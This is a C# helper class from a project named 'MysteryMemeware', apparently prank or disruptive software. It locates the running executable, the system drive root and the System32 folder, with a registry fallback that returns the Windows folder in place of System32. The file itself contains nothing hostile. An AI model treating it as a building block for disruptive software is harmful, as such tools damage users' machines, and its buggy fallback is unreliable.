//#Approve File 08/03/2022 11:35am.
using System.Diagnostics;
using System.IO;
using System;
namespace MysteryMemeware
{
    public static class PathHelper
    {
        public static string GetCurrentExePath()
        {
            string currentExePath = typeof(Program).Assembly.Location;
            if (currentExePath is not null && currentExePath is not "")
            {
                return currentExePath;
            }
            try
            {
                return Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                throw new Exception("Current exe path could not be located.");
            }
        }
        public static string GetRootDrivePath()
        {
            try
            {
                string system32Path = GetSystem32Path();
                return Path.GetPathRoot(system32Path);
            }
            catch
            {
                throw new Exception("Install drive path could not be located.");
            }
        }
        public static string GetSystem32Path()
        {
            if (Environment.SystemDirectory is not null && Environment.SystemDirectory is not "")
            {
                return Environment.SystemDirectory;
            }
            try
            {
                object systemRootObject = RegistryHelper.GetRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRoot"));
                if (systemRootObject is not null && systemRootObject.GetType() == typeof(string))
                {
                    return (string)systemRootObject;
                }
            }
            catch
            {

            }

            if (Directory.Exists("C:\\Windows\\system32"))
            {
                return "C:\\Windows\\system32";
            }

            throw new Exception("System32 path could not be located.");
        }
    }
}